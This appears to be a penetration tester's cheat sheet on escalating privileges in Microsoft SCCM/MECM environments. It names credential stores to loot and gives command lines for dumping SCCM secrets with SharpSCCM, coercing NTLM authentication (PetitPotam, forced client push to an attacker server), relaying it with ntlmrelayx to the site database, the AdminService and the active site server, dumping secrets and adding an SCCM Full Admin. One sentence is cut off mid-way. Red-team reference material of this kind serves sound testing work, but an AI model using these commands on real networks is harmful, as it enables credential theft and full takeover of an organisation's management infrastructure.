# Privesc

## Retrieve credentials



- **Client Push Accounts** - Service accounts with local admin privileges to deploy packages. See the next part.
- **NAA (Network Access Account) credentials** - manually added (domain) account, used by an SCCM client to request from an SCCM Distribution Point. 
- **TaskSequence variables** - Can be used to perform specific actions (ex: integrate a machine on the domain)/
- **Application & Script Looting** - Application and scripts deployed by SCCM can contains secrets.  
- **Device Collection variables** - variables used for custom collections (Ex: windows 10 machines).

```
(not tested yet)
SystemDPAPIdump.py -creds -sccm login@target
SharpSCCM.exe local secrets -m wmi
SharpSCCM.exe local secrets -m disk
```


## Coercion

If the client push is not installed, it is possible to wait for Client Push Installation:
```
Inveigh.exe
```
It is also possible to force Client Push Installation (! not opsec !):
```
SharpSCCM.exe invoke client-push -t <AttackerServer>
```
If you are admin of the Management Point, use parameter: "--as-admin" 

Cleanup the mess:
If you run the previous command with "--as-admin" parameter, it is ok. whitout this parameter, delete the device name that you create.


## SCCM site takeover

If you manage to relay a NTLM authentication coming from the primary site server to the 

You are then Administrator on the following servers:

- site servers
- Each SQL Server that hosts the site database
- Each SMS Provider for the site

### Relay to the MSSQL site database
#### Requirements:

- automatic site assignment and automatic site-wide client push installation are enabled
- fallback to NTLM authentication is enabled (default)
- the hotfix KB15599094 not installed (it prevents the client push installation account to perform an NTLM connection to a client)
- PKI certificates are not required for client authentication (default)
- either: MSSQL is reachable on the site database server OR SMB is reachable and SMB signing isnâ€™t required on the site database server
- knowing the three-character site code for the SCCM site is required
- knowing the NetBIOS name, FQDN, or IP address of a site management point and site database server 


It is possible to target SMB or MSSQL service. 
```txt
ntlmrelayx.py -t "[protocol://]siteDatabase.domain.local" -smb2support -socks
```
Coerce an authentication: 
```txt
Coerce with petitpotam, printspoofer, or client push
```
Connect to MSSQL instance:
```txt
proxychains mssqlclient.py
```
More information on: 

https://www.thehacker.recipes/a-d/movement/sccm-mecm/privilege-escalation

### Relay to HTTP(S)
#### Requirements:
- The **HTTP API for the AdminService service** on the SMS Provider server
- knowing the NetBIOS name, FQDN, or IP address of a site management point and of a SMS provider server

It is possible to target HTTP(S) service:
```txt
ntlmrelayx.py -t https://smsprovider.domain.local/AdminService/wmi/SMS_Admin -smb2support --adminservice --logonname "DOMAIN\USER" --displayname "DOMAIN\USER" --objectsid <USER_SID>
```
Coerce an authentication: 
```txt
Coerce with petitpotam, printspoofer, or client push
```

### Relay from a passive to the active site server
#### Requirements:
- a **reachable passive site server** 
- knowing the NetBIOS name, FQDN, or IP address of the passive and active site servers 
- SMB signing is not required on the active site server (default)

It is then possible to target the passive to the active site server:
```txt
ntlmrelayx.py -t $ACTIVE_SERVER.$DOMAIN -smb2support -socks
```
Coerce an authentication: 
```txt
Coerce with petitpotam, printspoofer, or client push
```
Dump secrets on the active site server 
```txt
proxychains4 secretsdump.py 
```
then Add a new SCCM Full Admin
```txt
sccmhunter.py
```

## More information
https://www.securesystems.de/blog/active-directory-spotlight-attacking-the-microsoft-configuration-manager/
https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/accounts#network-access-account
https://www.thehacker.recipes/a-d/movement/sccm-mecm/privilege-escalation
